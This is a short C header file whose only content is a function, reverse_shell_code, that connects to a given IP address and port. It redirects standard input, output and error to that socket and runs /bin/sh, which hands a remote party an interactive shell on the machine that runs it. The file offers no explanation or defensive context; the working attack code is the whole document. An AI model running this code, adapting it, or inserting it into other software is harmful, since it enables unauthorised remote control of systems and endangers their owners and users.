#ifndef REVERSE_SHELL_CODE
#define REVERSE_SHELL_CODE

#include <arpa/inet.h> /* for htons() */
#include <sys/types.h> /* for socket() connect() */
#include <sys/socket.h>
#include <unistd.h> /* for close() dup2() execve() */

/*

*/
int reverse_shell_code(void * ip_str, int port)
{
    int socket_d;
    int n;
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    inet_pton(sa.sin_family,ip_str,&(sa.sin_addr));
    sa.sin_port = htons(port);

    socket_d = socket(AF_INET, SOCK_STREAM, 0);
    if(socket_d == -1)
    {
        return 1;
    }
    connect(socket_d, (struct sockaddr *)&sa, sizeof(sa));
    
    for(n=0 ; n<=2 ; n++)
    {
        close(n);
        dup2(socket_d,n);
    }
    execve("/bin/sh", NULL, NULL);
    return 0;
}

#endif